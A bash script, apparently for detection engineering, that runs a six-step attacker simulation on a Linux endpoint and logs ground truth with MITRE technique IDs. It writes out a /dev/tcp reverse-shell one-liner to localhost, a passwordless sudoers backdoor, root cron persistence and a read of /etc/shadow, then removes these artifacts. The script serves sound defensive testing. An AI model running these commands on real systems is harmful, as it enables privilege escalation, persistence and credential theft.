#!/bin/bash
#
# name:        11-linux_attack_sim.sh
# purpose:     Execute controlled attacker simulation on Linux endpoint and record ground truth
# author:      Steve - Cybersecurity Engineer
# date:        August 10, 2026
#
# .Purpose
#     This script executes a realistic attack sequence against a hardened Linux endpoint
#     and records ground truth data for telemetry validation. The sequence includes:
#
#         1. Create user account (testattacker)
#         2. Modify sudoers file (privilege escalation)
#         3. Execute binary from /tmp (suspicious execution)
#         4. Attempt reverse shell to localhost (C2 simulation)
#         5. Modify crontab for persistence
#         6. Access sensitive files (/etc/shadow)
#
#     After execution, all artifacts are cleaned up while preserving the ground truth log.
#
#     Output: linux_attack_log.json with action details, timestamps, detection sources, and MITRE techniques
#

set -euo pipefail

# Root check
if [[ $EUID -ne 0 ]]; then
    echo "[ERROR] This script requires root privileges. Please run with sudo." >&2
    exit 1
fi

# Configuration
USERNAME="testattacker"
OUTPUT_FILE="linux_attack_log.json"
SUDOERS_FILE="/etc/sudoers.d/backdoor"
CRON_FILE="/etc/cron.d/persistence_test"
BEACON_SCRIPT="/tmp/beacon.sh"
SUSPICIOUS_BIN="/tmp/suspicious_bin"

# Arrays for ground truth collection
declare -a ACTIONS
declare -a DESCRIPTORS
declare -a TIMESTAMPS
declare -a DETECTION_SOURCES
declare -a MITRE_TECHNIQUES

# Counter
ACTION_COUNT=0

# Cleanup flags
USER_CREATED=false
SUDOERS_MODIFIED=false
TMP_BINARY_EXISTS=false
CRON_MODIFIED=false
BEACON_EXISTS=false

get_utc_timestamp() {
    date -u +"%Y-%m-%dT%H:%M:%SZ"
}

add_ground_truth_entry() {
    local action_num="$1"
    local desc="$2"
    local timestamp="$3"
    local det_source="$4"
    local mitre="$5"

    ACTIONS+=("$action_num")
    DESCRIPTORS+=("$desc")
    TIMESTAMPS+=("$timestamp")
    DETECTION_SOURCES+=("$det_source")
    MITRE_TECHNIQUES+=("$mitre")
}

echo "[*] Running Linux attacker simulation..."

# Step 1: Create User Account
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Creating user %s...                %s\n" "$ACTION_COUNT" "$USERNAME" "$TIMESTAMP"

if useradd -m -s /bin/bash "$USERNAME" 2>/dev/null; then
    USER_CREATED=true
    add_ground_truth_entry "$ACTION_COUNT" "Created user account '$USERNAME'" "$TIMESTAMP" "auditd EID: user_add" "T1136.001 - Account Creation: Local Account"
else
    echo "          [ERROR: Failed to create user]" >&2
fi

# Step 2: Modify Sudoers
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Modifying sudoers...                        %s\n" "$ACTION_COUNT" "$TIMESTAMP"

# Modify /etc/sudoers.d/backdoor for privilege escalation
if echo "${USERNAME} ALL=(ALL) NOPASSWD:ALL" > "$SUDOERS_FILE" 2>/dev/null; then
    chmod 440 "$SUDOERS_FILE" 2>/dev/null || true
    SUDOERS_MODIFIED=true
    add_ground_truth_entry "$ACTION_COUNT" "Modified sudoers for privilege escalation" "$TIMESTAMP" "auditd EID: perm_mod" "T1548.003 - Sudo and Sudoers Abuse"
else
    echo "          [ERROR: Failed to modify sudoers]" >&2
fi

# Step 3: Execute Binary from /tmp
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Executing from /tmp...                      %s\n" "$ACTION_COUNT" "$TIMESTAMP"

if cp /usr/bin/id "$SUSPICIOUS_BIN" 2>/dev/null; then
    TMP_BINARY_EXISTS=true
    if "$SUSPICIOUS_BIN" 2>/dev/null; then
        add_ground_truth_entry "$ACTION_COUNT" "Executed binary from /tmp (suspicious execution)" "$TIMESTAMP" "auditd EID: execve" "T1059 - Command and Scripting Interpreter"
    else
        add_ground_truth_entry "$ACTION_COUNT" "Executed binary from /tmp (suspicious execution)" "$TIMESTAMP" "auditd EID: execve" "T1059 - Command and Scripting Interpreter"
    fi
else
    echo "          [ERROR: Failed to copy binary to /tmp]" >&2
fi

# Step 4: Attempt Reverse Shell to Localhost (safe simulation)
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Reverse shell attempt (localhost)...        %s\n" "$ACTION_COUNT" "$TIMESTAMP"

# Start background reverse shell attempt to localhost (will fail safely)
bash -c 'exec 5<>/dev/tcp/127.0.0.1/4444 && bash <&5 2>&1 >&5' 2>/dev/null &
REVERSE_PID=$!
sleep 1
kill "$REVERSE_PID" 2>/dev/null || true
wait "$REVERSE_PID" 2>/dev/null || true

add_ground_truth_entry "$ACTION_COUNT" "Attempted reverse shell connection to localhost" "$TIMESTAMP" "auditd EID: network_connect" "T1059 - Command and Scripting Interpreter"

# Step 5: Modify Crontab for Persistence
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Cron persistence...                         %s\n" "$ACTION_COUNT" "$TIMESTAMP"

# Create dummy beacon script
echo '#!/bin/bash' > "$BEACON_SCRIPT" 2>/dev/null || true
echo 'echo "beacon check"' >> "$BEACON_SCRIPT" 2>/dev/null || true
chmod +x "$BEACON_SCRIPT" 2>/dev/null || true
BEACON_EXISTS=true

# Modify cron
if echo "* * * * * root $BEACON_SCRIPT" > "$CRON_FILE" 2>/dev/null; then
    CRON_MODIFIED=true
    add_ground_truth_entry "$ACTION_COUNT" "Established cron job for persistence" "$TIMESTAMP" "auditd EID: cron_persist" "T1053.003 - Scheduled Task/Job"
else
    echo "          [ERROR: Failed to create cron persistence]" >&2
fi

# Step 6: Access Sensitive Files
ACTION_COUNT=$((ACTION_COUNT + 1))
TIMESTAMP=$(get_utc_timestamp)
printf "    [%d/6] Accessing /etc/shadow...                    %s\n" "$ACTION_COUNT" "$TIMESTAMP"

if cat /etc/shadow > /dev/null 2>&1; then
    add_ground_truth_entry "$ACTION_COUNT" "Read sensitive file /etc/shadow" "$TIMESTAMP" "auditd EID: file_access" "T1003 - OS Credential Dumping"
else
    echo "          [ERROR: Failed to access /etc/shadow]" >&2
fi

# Cleanup Phase
echo "[*] Cleaning up artifacts..."

CLEANUP_STATUS=""

# Remove user
if [[ "$USER_CREATED" == true ]]; then
    deluser --remove-home "$USERNAME" 2>/dev/null || userdel -r "$USERNAME" 2>/dev/null || true
    CLEANUP_STATUS="${CLEANUP_STATUS}User removed, "
fi

# Remove sudoers modification
if [[ "$SUDOERS_MODIFIED" == true ]] && [[ -f "$SUDOERS_FILE" ]]; then
    rm -f "$SUDOERS_FILE" 2>/dev/null || true
    CLEANUP_STATUS="${CLEANUP_STATUS}Sudoers restored, "
fi

# Remove /tmp binary
if [[ "$TMP_BINARY_EXISTS" == true ]] && [[ -f "$SUSPICIOUS_BIN" ]]; then
    rm -f "$SUSPICIOUS_BIN" 2>/dev/null || true
    CLEANUP_STATUS="${CLEANUP_STATUS}Binary removed, "
fi

# Remove cron persistence
if [[ "$CRON_MODIFIED" == true ]] && [[ -f "$CRON_FILE" ]]; then
    rm -f "$CRON_FILE" 2>/dev/null || true
    CLEANUP_STATUS="${CLEANUP_STATUS}Cron removed, "
fi

# Remove beacon script
if [[ "$BEACON_EXISTS" == true ]] && [[ -f "$BEACON_SCRIPT" ]]; then
    rm -f "$BEACON_SCRIPT" 2>/dev/null || true
    CLEANUP_STATUS="${CLEANUP_STATUS}Beacon script removed, "
fi

# Trim trailing comma and space
CLEANUP_STATUS="${CLEANUP_STATUS%, }"

if [[ -n "$CLEANUP_STATUS" ]]; then
    printf "    %s                           [CLEAN]\n" "$CLEANUP_STATUS"
else
    echo "    Artifacts already cleared                        [CLEAN]"
fi

echo "Actions executed: $ACTION_COUNT"
echo "Ground truth saved to: $OUTPUT_FILE"

# Generate Ground Truth JSON
{
    echo '{'
    echo '  "simulation_info": {'
    echo '    "hostname": "'$(hostname)'",'
    echo '    "platform": "Linux",'
    echo '    "timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'"'
    echo '  },'
    echo '  "actions": ['

    FIRST=true
    for i in "${!ACTIONS[@]}"; do
        if [[ "$FIRST" != true ]]; then
            echo ','
        fi
        FIRST=false

        # Escape special characters in descriptors for JSON
        DESC_ESCAPED="${DESCRIPTORS[$i]//\\/\\\\}"
        DESC_ESCAPED="${DESC_ESCAPED//\"/\\\"}"
        SOURCE_ESCAPED="${DETECTION_SOURCES[$i]//\\/\\\\}"
        SOURCE_ESCAPED="${SOURCE_ESCAPED//\"/\\\"}"
        MITRE_ESCAPED="${MITRE_TECHNIQUES[$i]//\\/\\\\}"
        MITRE_ESCAPED="${MITRE_ESCAPED//\"/\\\"}"

        printf '    {\n'
        printf '      "action_number": %d,\n' "${ACTIONS[$i]}"
        printf '      "description": "%s",\n' "$DESC_ESCAPED"
        printf '      "timestamp": "%s",\n' "${TIMESTAMPS[$i]}"
        printf '      "expected_detection_source": "%s",\n' "$SOURCE_ESCAPED"
        printf '      "mitre_attack_technique": "%s"\n' "$MITRE_ESCAPED"
        printf '    }'
    done

    echo ''
    echo '  ],'
    echo '  "total_actions": '"$ACTION_COUNT"
    echo '}'
} > "$OUTPUT_FILE"

echo "[*] Simulation complete."
